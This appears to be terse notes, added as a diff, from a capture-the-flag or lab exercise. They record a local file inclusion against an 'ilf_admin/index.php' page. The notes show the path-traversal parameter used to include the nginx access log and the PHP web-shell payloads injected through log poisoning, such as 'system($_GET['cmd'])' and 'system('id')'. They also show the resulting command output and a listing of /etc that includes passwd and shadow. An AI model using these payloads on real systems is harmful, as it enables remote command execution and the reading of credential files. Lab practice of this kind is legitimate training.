@@ -1,0 +1,62 @@
+http://178.128.162.230:32713/ilf_admin/index.php
+
+"uid=65534(nobody) gid=65534(nobody)
+
+/ilf_admin/index.php?log=/../../../../../var/log/nginx/access.log
+
+<?php system($_GET['cmd']); ?>
+
+<?php system(ls); ?>
+
+<?php system('id'); ?>
+
+<?php system('id'); ?>
+
+
+46.101.23.188:30255
+
+apk
+ca-certificates
+ca-certificates.conf
+conf.d
+crontabs
+fstab
+group
+group-
+hostname
+hosts
+init.d
+inittab
+inputrc
+issue
+logrotate.d
+modprobe.d
+modules
+modules-load.d
+motd
+mtab
+network
+nginx
+opt
+os-release
+passwd
+passwd-
+periodic
+php7
+profile
+profile.d
+protocols
+resolv.conf
+securetty
+services
+shadow
+shadow-
+shells
+ssl
+supervisor
+supervisord.conf
+sysctl.conf
+sysctl.d
+terminfo
+udhcpd.conf
+"
